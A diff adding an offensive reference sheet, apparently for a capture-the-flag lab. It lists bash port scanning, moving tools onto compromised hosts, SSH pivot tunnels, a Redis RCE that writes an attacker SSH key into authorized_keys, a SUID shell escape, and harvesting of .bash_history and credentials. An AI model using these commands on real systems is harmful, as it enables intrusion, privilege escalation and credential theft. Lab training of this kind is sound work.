@@ -1,0 +1,234 @@
+═══════════════════════════════════════════════════════════════════════════════
+                    LIVING OFF THE LAND - REFERENCE GUIDE
+                    Survival Techniques for Minimal Environments
+═══════════════════════════════════════════════════════════════════════════════
+
+TARGET PHILOSOPHY:
+Compromised servers have minimal tools. You must improvise with bash builtins,
+curl, and creativity. LAUNCHPAD is your workstation - it has baseline tools.
+
+═══════════════════════════════════════════════════════════════════════════════
+NETWORK RECONNAISSANCE
+═══════════════════════════════════════════════════════════════════════════════
+
+PARALLEL PORT SCANNER (bash only):
+  scan() {
+    local host=$1
+    for port in 21 22 25 53 69 80 111 139 143 161 443 445 993 2049 3306 5432 6379 8080 8443 9999; do
+      (echo >/dev/tcp/$host/$port) 2>/dev/null && echo "$port open" &
+    done
+    wait
+  }
+
+  # Usage:
+  scan 172.20.2.100
+
+BASH TCP CLIENT:
+  exec 3<>/dev/tcp/<ip>/<port>
+  echo "HELLO" >&3
+  cat <&3
+  # Close when done:
+  exec 3>&-
+
+CHECK LISTENING SOCKETS:
+  ss -tlnp                    # TCP listening
+  ss -ulnp                    # UDP listening
+  netstat -tlnp               # Alternative if ss unavailable
+
+═══════════════════════════════════════════════════════════════════════════════
+CURL MULTI-PROTOCOL OPERATIONS
+═══════════════════════════════════════════════════════════════════════════════
+
+HTTP:
+  curl http://<ip>/
+  curl -X OPTIONS http://<ip>/webdav/ -v    # WebDAV enumeration
+
+FTP:
+  curl ftp://<ip>/pub/                       # List directory
+  curl ftp://<ip>/pub/file.txt               # Download file
+  curl -u user:pass ftp://<ip>/              # Authenticated
+
+TFTP:
+  curl tftp://<ip>/configs/file.txt          # TFTP download
+
+WEBDAV PUT:
+  curl -T payload.php http://<ip>/webdav/    # Upload file
+
+RAW TCP:
+  curl telnet://<ip>:<port>                  # Raw TCP connection
+
+═══════════════════════════════════════════════════════════════════════════════
+FILE TRANSFER TECHNIQUES
+═══════════════════════════════════════════════════════════════════════════════
+
+NCAT PIPE:
+  # On receiver:
+  ncat -l -p 9000 > tool < /dev/null
+
+  # On sender:
+  ncat <ip> 9000 < tool
+
+BASE64 OVER SHELL:
+  # On source:
+  base64 tool | tr -d '\n'
+
+  # On target (paste base64 string):
+  echo "<base64_string>" | base64 -d > tool
+  chmod +x tool
+
+BUSYBOX HTTPD (Alpine has this):
+  # Serve files:
+  busybox httpd -f -p 8000 -h /path/to/serve
+
+  # Fetch from another host:
+  curl http://<server_ip>:8000/tool -o tool
+
+═══════════════════════════════════════════════════════════════════════════════
+SSH TUNNELING
+═══════════════════════════════════════════════════════════════════════════════
+
+LOCAL FORWARD (-L):
+  ssh -L <local_port>:<target_ip>:<target_port> user@<jump_host>
+  # Access target_ip:target_port via localhost:local_port
+
+  Example:
+  ssh -L 2121:172.20.3.100:21 operator@172.20.2.100
+  # Now: curl ftp://localhost:2121/
+
+REMOTE FORWARD (-R):
+  ssh -R <remote_port>:localhost:<local_port> user@<remote>
+  # Remote host can reach your local service
+
+  Example (callback):
+  ssh -R 9001:localhost:9001 user@<target>
+
+DYNAMIC FORWARD (-D) / SOCKS PROXY:
+  ssh -D 1080 user@<jump_host>
+  # Use with proxychains, curl --socks5
+
+  Example:
+  curl --socks5 localhost:1080 http://172.20.4.100/
+
+KEEP ALIVE:
+  ssh -o ServerAliveInterval=60 user@<host>
+
+═══════════════════════════════════════════════════════════════════════════════
+REDIS WITHOUT redis-cli
+═══════════════════════════════════════════════════════════════════════════════
+
+MANUAL REDIS PROTOCOL:
+  exec 3<>/dev/tcp/<redis_ip>/6379
+  echo -e "KEYS *\r\n" >&3; cat <&3
+  echo -e "GET flag-08\r\n" >&3; cat <&3
+
+  # SSH key injection (RCE):
+  echo -e "CONFIG SET dir /home/redis/.ssh/\r\n" >&3; cat <&3
+  echo -e "CONFIG SET dbfilename \"authorized_keys\"\r\n" >&3; cat <&3
+  echo -e "SET payload \"\\n\\nssh-ed25519 AAAA...your_key...\\n\\n\"\r\n" >&3; cat <&3
+  echo -e "SAVE\r\n" >&3; cat <&3
+
+  # Close:
+  exec 3>&-
+
+═══════════════════════════════════════════════════════════════════════════════
+SYSTEM INSPECTION
+═══════════════════════════════════════════════════════════════════════════════
+
+INSTALLED PACKAGES:
+  apk info                     # List all installed packages
+  apk info -L <package>        # List files from package
+
+SERVICE MANAGEMENT:
+  ls /etc/init.d/              # Available init scripts
+  rc-status --all              # Running vs. stopped services
+  rc-service <service> start   # Start a service (requires root/sudo)
+
+FIND BINARIES:
+  which socat ncat curl wget dig nmap
+
+SUID BINARIES (privesc hunting):
+  find / -perm -4000 -type f 2>/dev/null
+
+  # Or use linpeas.sh (in your home directory on LAUNCHPAD)
+
+CONFIG FILES:
+  find /etc -name "*.conf" 2>/dev/null
+
+═══════════════════════════════════════════════════════════════════════════════
+READING /proc (no tools needed)
+═══════════════════════════════════════════════════════════════════════════════
+
+TCP CONNECTIONS:
+  cat /proc/net/tcp            # TCP connections (hex format)
+
+  # Convert hex port to decimal:
+  printf "%d\n" 0x0050         # Returns: 80
+
+NETWORK INTERFACES:
+  cat /proc/net/dev
+
+ROUTING TABLE:
+  cat /proc/net/route
+
+═══════════════════════════════════════════════════════════════════════════════
+PRIVILEGE ESCALATION
+═══════════════════════════════════════════════════════════════════════════════
+
+RUN LINPEAS:
+  bash /tmp/linpeas.sh         # Transfer from LAUNCHPAD first
+
+  # Look for red/yellow highlights:
+  # - SUID binaries
+  # - Sudo misconfigurations
+  # - Writable /etc/passwd
+  # - Cron jobs
+  # - Kernel exploits
+
+GTFOBins (when you find SUID binaries):
+  # Example: SUID find
+  find . -exec /bin/sh -p \;
+
+  # Always check: https://gtfobins.github.io/
+
+═══════════════════════════════════════════════════════════════════════════════
+PROTOCOL-SPECIFIC NOTES
+═══════════════════════════════════════════════════════════════════════════════
+
+DNS ZONE TRANSFER:
+  # If dig available:
+  dig @<dns_ip> <zone> AXFR
+
+  # Without dig (manual):
+  # You'll need to improvise or tunnel to a host with dig
+
+SMB/SAMBA:
+  # If smbclient available:
+  smbclient -L //<ip>/         # List shares
+  smbclient //<ip>/<share>     # Connect to share
+
+  # Without smbclient:
+  # You'll need to improvise or transfer smbclient
+
+FTP:
+  # Built-in ftp client (if available):
+  ftp <ip>
+  > user anonymous
+  > pass anonymous@
+  > ls
+  > get <file>
+
+  # Or use curl (shown above)
+
+═══════════════════════════════════════════════════════════════════════════════
+REMEMBER:
+  1. Check /etc/hosts for next hop IPs
+  2. Read .bash_history on every shell you get
+  3. Check user home directories for .notes, .config, credentials
+  4. Look for stopped services (apk info, ls /etc/init.d/)
+  5. Filesystem inspection > blind exploitation
+  6. Build your tunnel chains methodically
+  7. Document your pivot path (draw a map!)
+
+═══════════════════════════════════════════════════════════════════════════════
+                              GOOD LUCK!
+═══════════════════════════════════════════════════════════════════════════════
